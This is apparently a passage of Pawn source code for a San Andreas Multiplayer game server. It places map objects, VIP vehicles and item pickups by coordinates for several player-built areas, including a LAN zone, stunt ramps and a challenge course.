	CreateSObject(623, 1232.857666, -2049.873535, 60.754356, 0.0000, 0.0000, 303.7500);
	CreateSObject(623, 1232.339111, -2023.745361, 60.368988, 0.0000, 0.0000, 236.2501);
	CreateSObject(3877, 1124.812378, -2046.479370, 73.897217, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.688110, -2046.315796, 71.722374, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.561890, -2045.760864, 69.931343, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.613159, -2044.020142, 68.603401, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.686768, -2042.328247, 70.079704, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.787598, -2042.202148, 72.255249, 0.0000, 87.6625, 11.2500);
	CreateSObject(3877, 1124.663574, -2041.773438, 74.099777, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1120.705688, -2036.925781, 72.172112, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1120.629639, -2036.930786, 70.910446, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1120.666504, -2036.986572, 69.424271, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1120.606079, -2036.850830, 73.160240, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.662964, -2032.234741, 73.553802, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.638672, -2032.174683, 71.582664, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.687866, -2032.016113, 69.488754, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.612915, -2030.732300, 73.411133, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.611938, -2029.859497, 72.354721, 0.0000, 87.6625, 0.0000);
	CreateSObject(3877, 1124.563599, -2030.993530, 71.474243, 0.0000, 87.6625, 0.0000);
	CreateSObject(974, 1100.157593, -2024.480835, 70.635544, 0.0000, 0.0000, 180.0000);
	CreateSObject(974, 1100.286987, -2049.881104, 70.685547, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1282.743896, -2036.853882, 60.670715, 0.0000, 0.0000, 270.0000);
	CreateSObject(3660, 1282.732422, -2017.254150, 60.672199, 0.0000, 0.0000, 270.0000);
	CreateSObject(3660, 1282.728394, -2012.567261, 60.543625, 0.0000, 0.0000, 270.0000);
	CreateSObject(3660, 1259.889526, -2004.112427, 61.526253, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1252.600586, -2004.106445, 61.514809, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1248.418579, -2003.604004, 61.534908, 0.0000, 0.0000, 0.0001);
	CreateSObject(3439, 1185.484375, -2032.754272, 72.121162, 0.0000, 0.0000, 0.0000);
	CreateSObject(3439, 1180.675781, -2026.970825, 72.121162, 0.0000, 0.0000, 0.0000);
	CreateSObject(3439, 1169.598633, -2027.383789, 72.121162, 0.0000, 0.0000, 0.0000);
	CreateSObject(3439, 1164.149170, -2033.077148, 72.113960, 0.0000, 0.0000, 0.0000);
	CreateSObject(3439, 1164.283813, -2040.927002, 72.121162, 0.0000, 0.0000, 0.0000);
	CreateSObject(3439, 1169.658936, -2046.822021, 72.121162, 0.0000, 0.0000, 0.0000);
	CreateSObject(3439, 1180.428101, -2046.762939, 72.121162, 0.0000, 0.0000, 0.0000);
	CreateSObject(3439, 1185.717041, -2040.884521, 72.113960, 0.0000, 0.0000, 0.0000);
	CreateSObject(1597, 1240.617920, -2028.203491, 61.631653, 0.0000, 0.0000, 179.2951);
	CreateSObject(1597, 1240.921753, -2046.388062, 61.619762, 0.0000, 0.0000, 180.0000);
	CreateSObject(8887, 1154.074707, -2054.029297, 68.766739, 0.0000, 0.0000, 90.0000);
	CreateSObject(8887, 1196.716797, -2055.665283, 68.766739, 0.0000, 0.0000, 270.0000);
	CreateSObject(8887, 1154.748413, -2019.635376, 68.773941, 0.0000, 0.0000, 0.0000);
	CreateSObject(8887, 1195.858765, -2018.943115, 68.773941, 0.0000, 0.0000, 0.0000);
	CreateSObject(8991, 1155.639038, -1998.637939, 68.708496, 0.0000, 0.0000, 0.0000);
	CreateSObject(8991, 1192.404907, -1999.128784, 68.708496, 0.0000, 0.0000, 0.0000);
	CreateSObject(8991, 1154.028198, -2075.399658, 68.708496, 0.0000, 0.0000, 0.0000);
	CreateSObject(8991, 1192.557129, -2074.590820, 68.708496, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1250.716064, -2046.619873, 60.430893, 0.0000, 0.0000, 358.2811);
	CreateSObject(8674, 1248.144775, -2046.529663, 60.444992, 0.0000, 0.0000, 358.2811);
	CreateSObject(8674, 1250.713379, -2046.609497, 63.206043, 0.0000, 0.0000, 357.5763);
	CreateSObject(8674, 1210.763794, -2075.775146, 69.474731, 0.0000, 0.0000, 89.7594);
	CreateSObject(8674, 1210.772339, -2075.761475, 72.052811, 0.0000, 0.0000, 89.7594);
	CreateSObject(8674, 1205.580078, -2080.892822, 69.474731, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1205.582031, -2080.911133, 72.041023, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1211.098267, -1998.187622, 71.530815, 0.0000, 0.0000, 268.2811);
	CreateSObject(8674, 1233.619995, -2002.692505, 62.416073, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1233.627197, -2002.741821, 64.769249, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1228.491577, -2002.765747, 64.741699, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1225.909058, -2002.716919, 66.298706, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1223.321045, -2002.691162, 68.683235, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1231.055176, -2002.718628, 67.662323, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1220.756104, -2002.666626, 70.530861, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1218.183716, -2002.685059, 68.679520, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1218.188232, -2002.659790, 70.541672, 0.0000, 0.0000, 180.0000);
	CreateSObject(8167, 1213.541504, -2002.636719, 69.030090, 0.0000, 0.0000, 270.6186);
	CreateSObject(8167, 1213.531616, -2002.613403, 70.711876, 0.0000, 0.0000, 269.7591);
	CreateSObject(3660, 1260.109009, -2004.096436, 60.963753, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1269.001465, -2004.067261, 60.507309, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1270.415405, -2001.411621, 61.866085, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1270.462891, -2001.411621, 62.525169, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1268.991455, -2004.122192, 61.528217, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1273.982910, -2004.127075, 60.553555, 0.0000, 0.0000, 180.0000);
	CreateSObject(3660, 1273.996338, -2004.124756, 61.541431, 0.0000, 0.0000, 180.0000);
	CreateSObject(8171, 1016.458008, -2069.563965, 72.271240, 0.0000, 0.0000, 269.7591);
	CreateSObject(3361, 1108.928833, -2078.170410, 70.016365, 0.0000, 0.0000, 0.0000);
	CreateSObject(2633, 1105.227295, -2077.072510, 70.592087, 0.8594, 359.1406, 89.3814);
	CreateSObject(2633, 1105.321411, -2072.826660, 70.629150, 0.8594, 359.1406, 88.5220);
	CreateSObject(2633, 1104.462646, -2069.730225, 70.689735, 0.8594, 0.0000, 359.1406);
	CreateSObject(2633, 1100.195801, -2069.679688, 70.698914, 0.8594, 0.0000, 359.1406);
	CreateSObject(2633, 1095.944580, -2069.605469, 70.723358, 0.8594, 0.0000, 359.1406);
	CreateSObject(2633, 1091.706299, -2069.533203, 70.718544, 0.8594, 0.0000, 359.1406);
	CreateSObject(2633, 1087.529053, -2069.495850, 70.719826, 0.8594, 0.0000, 359.1406);
	CreateSObject(3268, 1069.039795, -2069.840088, 72.271240, 0.0000, 0.0000, 0.0000);
	CreateVIPVehicle(457,1177.8644,-2065.2585,68.6274,0.2783,32,1); // VIP Vehicles
	CreateVIPVehicle(457,1171.9937,-2065.3191,68.6274,359.4464,45,1); // VIP Vehicles
	CreateVIPVehicle(457,1177.6404,-2008.6716,68.6274,178.7941,13,1); // VIP Vehicles
	CreateVIPVehicle(457,1172.4385,-2008.6326,68.6274,178.4322,34,1); // VIP Vehicles
	CreateVIPVehicle(462,1175.0503,-2008.5453,68.6003,176.1212,12,12); // VIP Vehicles
	CreateVIPVehicle(462,1175.0315,-2065.5461,68.6004,0.0436,13,13); // VIP Vehicles
	CreateVIPVehicle(509,1132.9348,-1996.9293,68.5199,181.5924,61,1); // VIP Vehicles
	CreateVIPVehicle(509,1133.7988,-1996.9156,68.5199,181.9720,74,1); // VIP Vehicles
	CreateVIPVehicle(510,1131.3781,-1996.9402,68.6162,180.3897,39,39); // VIP Vehicles
	CreateVIPVehicle(510,1130.4817,-1996.9453,68.6163,180.6286,28,28); // VIP Vehicles
	CreateVIPVehicle(481,1128.7295,-1996.9900,68.5237,174.2357,12,9); // VIP Vehicles
	CreateVIPVehicle(481,1127.8784,-1996.8826,68.5242,178.1705,26,1); // VIP Vehicles
	CreateVIPVehicle(402,1249.0554,-2012.6558,59.5646,179.0981,22,22); // VIP Vehicles
	CreateVIPVehicle(402,1253.0088,-2012.6224,59.4519,180.5065,30,30); // VIP Vehicles
	CreateVIPVehicle(535,1259.2633,-2012.3915,59.2041,179.1039,66,1); // VIP Vehicles
	CreateVIPVehicle(535,1265.0885,-2012.1667,59.0377,180.3510,97,1); // VIP Vehicles
	CreateVIPVehicle(560,1262.1837,-2012.4058,59.0630,178.7088,52,39); // VIP Vehicles
	CreateVIPVehicle(545,1245.0675,-2018.3793,59.6641,269.2800,28,96); // VIP Vehicles
	CreateVIPVehicle(555,1244.9486,-2021.4484,59.5407,270.3335,60,1); // VIP Vehicles
	CreateVIPVehicle(565,1275.3344,-2012.3680,58.6064,181.0549,53,53); // VIP Vehicles
	CreateVIPVehicle(562,1272.3510,-2012.1677,58.7274,179.1665,35,1); // VIP Vehicles
	CreateVIPVehicle(559,1269.1199,-2012.2429,58.8118,177.9214,58,8); // VIP Vehicles
	CreateVIPVehicle(409,1276.3910,-2045.0565,58.8495,88.7868,1,1); // VIP Vehicles
	CreateVIPVehicle(409,1276.4304,-2041.9122,58.8367,89.3418,1,1); // VIP Vehicles
	CreateVIPVehicle(520,1071.7659,-2069.6382,74.0015,89.6989,0,0); // VIP Vehicles
	CreateVIPVehicle(513,1071.7222,-2059.6760,73.8142,117.9274,21,34); // VIP Vehicles
	CreateVIPVehicle(513,1071.0027,-2079.2549,73.8247,65.3802,30,34); // VIP Vehicles
	CreateVIPVehicle(487,1117.4655,-2051.2551,74.6057,266.3918,3,29); // VIP Vehicles
	CreateVIPVehicle(487,1116.7175,-2022.2126,74.6023,267.0296,12,39); // VIP Vehicles
	CreatePickupEx(1240,2,1131.4229,-2045.5815,69.0078); // health
	CreatePickupEx(1242,2,1131.4330,-2048.6636,69.0078); // armour
	CreatePickupEx(1241,2,1131.3151,-2051.3420,69.0078); // drugs
	CreatePickupEx(351,2,1131.4025,-2054.0979,69.0078); // combat
	CreatePickupEx(352,2,1131.2002,-2057.6506,69.0078); // uzi
	CreatePickupEx(355,2,1131.5702,-2029.1024,69.0078); // ak47
	CreatePickupEx(358,2,1131.7830,-2026.1389,69.0078); // sniper
	CreatePickupEx(346,2,1131.7466,-2023.6727,69.0078); // 9mm
	CreatePickupEx(341,2,1131.6835,-2020.5291,69.0078); // chainsaw
	CreatePickupEx(359,2,1131.5603,-2017.8452,69.0078); // rocket
	CreatePickupEx(356,2,1124.5657,-2043.9424,74.4297); // m4
	CreatePickupEx(358,2,1123.8721,-2029.8242,74.4297); // sniper
	CreatePickupEx(342,2,1121.7532,-2007.6339,74.4297); // grenade
	CreatePickupEx(344,2,1121.0404,-2065.5327,74.4297); // molotov
	// Lan (Amit_B + Hystax1.2):
	#if new_lan == true
	CreateSObject(3374,2029.792236,1298.312377,10.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1295.312377,10.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1292.312377,10.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1292.312377,16.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1292.312377,13.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1292.312377,19.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1292.312377,22.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1304.312377,10.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1304.312377,13.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1304.312377,16.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1304.312377,19.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1304.312377,22.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1310.312377,10.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1310.312377,13.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1310.312377,16.820312,0.00000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1310.312377,19.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1310.312377,22.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1307.312377,22.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1307.312377,16.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1319.812377,16.820312,315.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1318.812377,18.820312,315.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1316.312377,10.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1316.312377,16.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1316.312377,13.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1316.312377,19.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1316.312377,22.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1322.312377,10.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1322.312377,16.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1322.312377,13.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1322.312377,19.820312,0.000000,0.000000,0.000000);
	CreateSObject(3374,2029.792236,1322.312377,22.820312,0.000000,0.000000,0.000000);
	#endif
	// 0.1.8 - CTest (SimsoN):
	CreateSObject(4563, -2242.818848, -1555.685547, 459.414764, 0.0000, 286.9479, 206.1607);
	CreateSObject(4563, -2042.800537, -1458.345825, 531.785095, 0.0000, 291.2451, 205.3012);
	CreateSObject(4550, -1849.007690, -1369.718018, 556.159790, 0.0000, 122.8994, 34.4810);
	CreateSObject(4550, -1655.911011, -1238.720337, 386.668579, 0.0000, 122.8994, 34.4810);
	CreateSObject(1634, -1511.054077, -1141.353760, 299.922241, 0.0000, 0.0000, 303.7500);
	CreateSObject(1634, -1513.401489, -1138.003052, 299.946838, 0.0000, 0.0000, 303.7500);
	CreateSObject(1634, -1508.953125, -1144.939697, 299.745148, 0.0000, 0.0000, 303.7500);
	// 0.1.8 - LWU:
	CreateSObject(972, -817.537415, 472.883606, 31.932295, 0.0000, 0.0000, 270.6186);
	CreateSObject(972, -842.854553, 471.433258, 31.932295, 0.0000, 0.0000, 270.6186);
	CreateSObject(972, -802.157837, 458.451141, 32.041718, 0.0000, 358.2811, 180.3774);
	CreateSObject(972, -802.096863, 446.227173, 32.041718, 0.0000, 358.2811, 180.3774);
	CreateSObject(972, -815.694641, 428.071777, 32.041718, 0.0000, 358.2811, 91.1508);
	CreateSObject(972, -835.147644, 427.589264, 32.041718, 0.0000, 358.2811, 91.1508);
	CreateSObject(972, -844.271912, 445.795074, 32.041718, 0.0000, 0.0000, 181.3917);
	CreateSObject(972, -844.059631, 458.776520, 32.041718, 0.0000, 0.0000, 181.3917);
	CreateSObject(972, -818.307922, 471.685669, 32.038040, 0.0000, 0.0000, 270.6186);
	CreateSObject(3625, -810.060730, 462.930786, 34.876331, 0.0000, 0.0000, 0.0000);
	CreateSObject(3625, -813.725891, 451.979401, 36.978920, 0.0000, 0.0000, 273.1970);
	CreateSObject(3625, -811.706360, 435.414795, 39.954720, 0.0000, 0.0000, 89.3814);
	CreateSObject(3625, -825.596375, 439.299164, 42.930519, 0.0000, 0.0000, 179.6226);
	CreateSObject(6052, -817.445068, 449.940887, 45.818783, 0.0000, 354.7399, 103.2359);
	CreateSObject(3625, -809.146667, 470.154907, 52.069012, 0.0000, 0.0000, 97.9757);
	CreateSObject(3625, -821.708374, 467.549561, 55.044811, 0.0000, 7.7349, 335.9358);
	CreateSObject(1245, -833.713745, 458.139038, 65.788483, 0.0000, 0.8594, 110.0078);
	CreateSObject(3625, -825.419434, 451.540527, 70.122223, 0.0000, 349.6868, 335.9358);
	CreateSObject(3364, -819.781311, 442.281555, 71.951576, 0.0000, 292.9640, 359.1406);
	CreateSObject(3458, -829.873474, 439.218445, 73.233231, 0.0000, 27.5020, 350.6235);
	CreateSObject(982, -846.961670, 451.092773, 84.404037, 0.0000, 278.3536, 353.1245);
	CreateSObject(6052, -835.476929, 467.519806, 86.161148, 0.0000, 1.7189, 88.4177);
	CreateSObject(6052, -835.245117, 472.334625, 89.819252, 0.0000, 1.7189, 238.8195);
	CreateSObject(6052, -839.569641, 475.072327, 94.837852, 0.0000, 340.2330, 63.5983);
	CreateSObject(13636, -833.756470, 486.765747, 98.493828, 0.0000, 0.0000, 0.0000);
	CreateSObject(13638, -825.274780, 499.710236, 105.037636, 0.0000, 17.1887, 241.5023);
	CreateSObject(5746, -798.935791, 576.294678, 117.588448, 0.0000, 358.2811, 349.6868);
	CreateSObject(972, -814.642029, 490.803986, 108.371246, 0.0000, 357.4217, 79.0681);
	CreateSObject(1634, -757.807678, 1093.909180, 66.115402, 0.0000, 0.0000, 0.0000);
	CreateSObject(2053, -845.557617, 457.782990, 32.100468, 0.0000, 0.0000, 0.0000);
	CreateSObject(3364, -827.205811, 464.716614, 55.867649, 0.0000, 0.0000, 0.0000);
	CreateSObject(3364, -833.471985, 462.611481, 58.652336, 0.0000, 0.0000, 280.9319);
	CreateSObject(5153, -834.427368, 461.039001, 63.239193, 0.0000, 345.3896, 287.8074);
	CreateSObject(8417, -825.930420, 449.494904, 32.408443, 0.0000, 0.0000, 0.0000);
	CreateSObject(5746, -772.340942, 737.221497, 135.400742, 0.0000, 358.2811, 350.5462);
	CreateSObject(5746, -750.057251, 894.814026, 152.043472, 0.0000, 358.2811, 352.2651);
	CreateSObject(5746, -727.211060, 1068.614258, 172.889038, 0.0000, 358.2811, 352.2651);
	CreateSObject(1655, -799.319031, 578.294128, 117.212601, 0.0000, 357.4217, 350.6235);
	CreateSObject(18450, -712.907471, 1188.062500, 165.355606, 0.0000, 23.2048, 83.3653);
	CreateSObject(18450, -707.393555, 1239.133057, 143.299088, 0.0000, 23.2048, 83.3653);
	CreateSObject(18450, -700.918457, 1298.857178, 121.990402, 0.0000, 13.7510, 84.2247);
	CreateSObject(1632, -739.503723, 982.314575, 162.367813, 0.0000, 0.0000, 352.2651);
	CreateSObject(18450, -698.915771, 1318.979980, 117.323357, 0.0000, 8.5944, 84.2247);
	CreateSObject(18450, -693.920776, 1356.480713, 110.804993, 0.0000, 6.8755, 84.2247);
	CreateSObject(1634, -694.564087, 1393.858765, 107.955505, 0.0000, 0.0000, 353.1245);
	CreateSObject(1634, -690.427185, 1393.421143, 107.974518, 0.0000, 0.0000, 353.1245);
	CreateSObject(1634, -686.612183, 1393.037842, 107.974220, 0.0000, 0.0000, 353.1245);
	CreateSObject(1634, -682.784973, 1392.951904, 108.141556, 0.0000, 0.0000, 353.1245);
	CreateSObject(1632, -727.143555, 1070.155640, 172.597305, 0.0000, 0.0000, 355.7028);
	CreateSObject(1632, -722.861023, 1069.530396, 172.635025, 0.0000, 359.1406, 353.9839);
	CreateSObject(1632, -731.086853, 1070.285645, 172.361404, 0.0000, 0.0000, 355.7028);
	CreateVehicleEx(411,-815.0848,509.6272,109.1649,346.9646,-1,-1,respawntime,0,0); // infernus
	CreateVehicleEx(411,-807.4147,508.9385,109.4235,349.8829,-1,-1,respawntime,0,0); // infernus
	CreateVehicleEx(522,-810.4120,510.6232,109.2111,345.9980,-1,-1,respawntime,0,0); // nrg
	CreateVehicleEx(522,-812.5095,510.6479,109.1349,350.0441,-1,-1,respawntime,0,0); // nrg
	CreateVehicleEx(522,-804.3083,514.0891,109.7400,352.2322,-1,-1,respawntime,0,0); // nrg-lwu
	CreateVehicleEx(522,-817.5230,516.5587,109.3401,352.0275,-1,-1,respawntime,0,0); // nrg-lwu
	// 0.1.8 - Challenge (SouLeSs):
	CreateSObject(4002, 1074.492432, 1749.081909, 33.181831, 0.0000, 0.0000, 270.0000);
	CreateSObject(2773, 1089.131104, 1724.207397, 10.337541, 0.0000, 0.0000, 270.0000);
	CreateSObject(2773, 1089.104614, 1726.956299, 10.337541, 0.0000, 0.0000, 90.0000);
	CreateSObject(2773, 1091.046509, 1723.976563, 10.337541, 0.0000, 0.0000, 78.7500);
	CreateSObject(2773, 1091.001221, 1726.768066, 10.337541, 0.0000, 0.0000, 78.7500);
	CreateSObject(1454, 1087.286987, 1723.387329, 11.801220, 0.0000, 0.0000, 90.0000);
	CreateSObject(1454, 1087.337036, 1721.082397, 13.133497, 0.0000, 0.0000, 90.0000);
	CreateSObject(3286, 1087.762451, 1714.743774, 16.329527, 0.0000, 312.7310, 90.2408);
	CreateSObject(12918, 1082.932983, 1703.956787, 19.983118, 0.0000, 0.0000, 90.0000);
	CreateSObject(12918, 1077.800049, 1704.215454, 20.004099, 0.0000, 0.0000, 0.0000);
	CreateSObject(978, 1067.648438, 1703.439575, 23.655001, 0.0000, 344.5301, 179.1405);
	CreateSObject(978, 1067.231567, 1703.039185, 23.815823, 0.0000, 14.6104, 358.2811);
	CreateSObject(978, 1067.210205, 1703.076782, 23.710756, 0.0000, 345.3896, 179.1405);
	CreateSObject(983, 1074.981079, 1697.481934, 21.695004, 0.0000, 0.0000, 90.0000);
	CreateSObject(983, 1081.430908, 1697.494507, 21.695004, 0.0000, 0.0000, 90.0000);
	CreateSObject(984, 1089.632080, 1704.381104, 21.627148, 0.0000, 0.0000, 0.0000);
	CreateSObject(983, 1086.404663, 1697.967407, 21.697758, 0.0000, 0.0000, 90.0000);
	CreateSObject(983, 1071.760620, 1700.626343, 21.673405, 0.0000, 0.0000, 0.0000);
	CreateSObject(2633, 1061.685913, 1704.617798, 23.360157, 0.0000, 0.0000, 90.0000);
	CreateSObject(4106, 1055.810303, 1708.686890, 23.414946, 0.0000, 0.0000, 90.0000);
	CreateSObject(5822, 1046.972290, 1712.024414, 28.970078, 0.0000, 0.0000, 96.0160);
	CreateSObject(10009, 1046.136597, 1712.929199, 38.574295, 0.0000, 0.0000, 135.0000);
	CreateSObject(10009, 1044.804321, 1718.671509, 46.205727, 0.0000, 0.0000, 270.0000);
	CreateSObject(982, 1055.992676, 1712.530762, 50.158035, 0.0000, 270.6186, 269.1406);
	CreateSObject(982, 1056.056274, 1711.874146, 50.844921, 0.0000, 0.0000, 89.1405);
	CreateSObject(3279, 1085.930664, 1724.595093, 47.042923, 0.0000, 0.0000, 180.0000);
	CreateSObject(2931, 1089.038940, 1729.126465, 63.179459, 0.0000, 0.0000, 326.2500);
	CreateSObject(18367, 1089.481689, 1728.694824, 64.735245, 0.0000, 0.0000, 146.2500);
	CreateSObject(13647, 1090.078491, 1765.411987, 70.940598, 0.0000, 350.5462, 123.7499);
	CreateSObject(991, 1104.910400, 1751.979248, 69.592712, 0.0000, 268.0403, 326.2500);
	CreateSObject(9767, 1043.069824, 1760.358276, 82.526855, 0.0000, 0.0000, 123.7499);
	CreateSObject(11479, 1014.858093, 1738.963623, 95.105904, 0.0000, 0.0000, 213.7500);
	CreateSObject(11496, 1033.569946, 1740.825317, 97.660423, 0.0000, 0.0000, 123.7499);
	CreateSObject(2773, 1026.998657, 1736.536987, 98.377647, 0.0000, 0.0000, 33.7500);
	CreateSObject(2773, 1025.913086, 1738.106567, 98.377647, 0.0000, 0.0000, 33.7500);
	CreateSObject(2773, 1026.402832, 1741.239624, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1028.008667, 1742.295776, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1030.359741, 1743.876709, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1031.941406, 1744.976440, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1034.398560, 1746.560791, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1036.000366, 1747.637207, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1031.126343, 1736.505249, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1032.740967, 1737.571411, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1034.344238, 1738.643677, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1035.950928, 1739.702881, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1037.567383, 1740.782715, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(2773, 1039.169434, 1741.810181, 98.377647, 0.0000, 0.0000, 303.7500);
	CreateSObject(1245, 1041.774902, 1745.077148, 98.733604, 0.0000, 0.0000, 213.7500);
	CreateSObject(13643, 1053.481323, 1746.420776, 99.862061, 0.0000, 0.0000, 0.0000);
	CreateSObject(983, 1054.600708, 1746.412231, 98.753983, 0.0000, 270.6186, 88.2811);
	CreateSObject(983, 1061.641724, 1739.959473, 102.009117, 0.0000, 269.7592, 0.0000);
	CreateSObject(2773, 1060.773926, 1748.199463, 101.058975, 0.0000, 0.0000, 90.0000);
	CreateSObject(14875, 1062.642700, 1734.996704, 102.858490, 0.0000, 0.0000, 90.0000);
	CreateSObject(5130, 1069.882202, 1734.266602, 105.667114, 0.0000, 0.0000, 225.0000);
	CreateSObject(12839, 1079.299927, 1734.441772, 106.643082, 0.0000, 0.0000, 90.0000);
	CreateSObject(971, 1084.839600, 1738.443359, 114.811249, 0.0000, 0.0000, 90.0000);
	CreateSObject(978, 1062.399902, 1738.589966, 112.306564, 0.0000, 0.0000, 270.0000);
	CreateSObject(978, 1065.881348, 1760.159912, 112.181557, 0.0000, 0.0000, 180.0000);
	CreateSObject(5822, 1083.872681, 1754.665161, 117.836235, 0.0000, 0.0000, 274.3746);
	CreatePickupEx(371,2,1075.2280,1748.0233,133.9117); // challenge_para
	// 0.1.8B - BigRampa (Yosi):
	CreateSObject(8417, 847.543213, -3026.972168, 1.739243, 0.0000, 0.0000, 0.0000);
	CreateSObject(8417, 848.437500, -2986.522461, 1.735562, 0.0000, 0.0000, 90.2408);
	CreateSObject(8417, 808.519775, -2986.426514, 1.731882, 0.0000, 0.0000, 90.2408);
	CreateSObject(8417, 808.128723, -2945.100342, 1.728201, 0.0000, 0.0000, 90.2408);
	CreateSObject(8417, 809.211243, -3026.999512, 1.735561, 0.0000, 0.0000, 0.0000);
	CreateSObject(8417, 848.145874, -2945.154053, 1.724520, 0.0000, 0.0000, 90.2408);
	CreateSObject(8417, 847.925842, -2903.777100, 1.720840, 0.0000, 0.0000, 90.2408);
	CreateSObject(8417, 807.983887, -2903.767334, 1.724520, 0.0000, 0.0000, 90.2408);
	CreateSObject(8417, 847.947021, -2862.469482, 1.717159, 0.0000, 0.0000, 90.2408);
	CreateSObject(8417, 808.092590, -2862.535645, 1.717159, 0.0000, 0.0000, 90.2408);
	CreateSObject(18450, 835.040283, -3008.050537, -8.139786, 0.0000, 308.4339, 270.6186);
	CreateSObject(8417, 848.682495, -3026.028809, 1.731882, 0.0000, 0.0000, 90.2408);
	CreateSObject(18450, 835.522522, -3052.201660, 56.948219, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 835.887085, -3088.543945, 120.207420, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 836.268921, -3124.970215, 183.758240, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 836.697632, -3162.713623, 249.569153, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 837.052979, -3198.884521, 312.624359, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 837.388733, -3232.649902, 371.492493, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 837.798950, -3268.948730, 434.814636, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 838.206238, -3306.697998, 500.617920, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 838.549805, -3342.808838, 563.556274, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 838.881104, -3377.313721, 623.614563, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 839.303894, -3416.057617, 691.140564, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 839.684326, -3454.157471, 757.597595, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 840.449768, -3513.622559, 792.226563, 0.0000, 0.0000, 270.6960);
	CreateSObject(8417, 841.345581, -3574.191895, 792.605713, 0.0000, 0.0000, 269.6046);
	CreateSObject(972, 850.658203, -3598.092529, 792.563538, 0.0000, 1.7189, 89.3814);
	CreateSObject(972, 835.698059, -3597.805420, 792.563538, 0.0000, 1.7189, 89.3814);
